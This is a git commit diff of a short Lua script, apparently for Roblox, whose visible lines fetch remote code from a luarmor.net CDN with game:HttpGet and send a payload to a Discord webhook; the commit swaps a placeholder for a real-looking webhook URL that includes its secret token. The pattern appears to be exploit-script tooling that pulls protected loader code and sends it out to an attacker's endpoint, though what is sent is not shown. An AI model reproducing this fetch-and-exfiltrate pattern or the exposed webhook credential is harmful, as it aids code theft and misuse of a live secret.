1ff730f23e0bf6687201e73eefd3f711842db6d5
Draven Porsche <130072414+DravenPorschE@users.noreply.github.com>
2025-07-26 12:39:04 +0800

    asdasdasd

--- test.lua
+++ test.lua
@@ -2,7 +2,7 @@
 local fetchedCode = game:HttpGet("https://cdn.luarmor.net/v4_init_may312.lua")
 
 -- Your Discord webhook URL
-local webhookUrl = "https://discord.com/api/webhooks/your_webhook_here"
+local webhookUrl = "https://discord.com/api/webhooks/1396029154436317336/nElUehqp9JyDZ_REYRcQPXm7FMdnM2Rg3_zMw-Ftm7_zl5A2o4zoc7GaHaSbCi-y7xvb"
 
 -- Format the message to send to Discord
 local payload = {
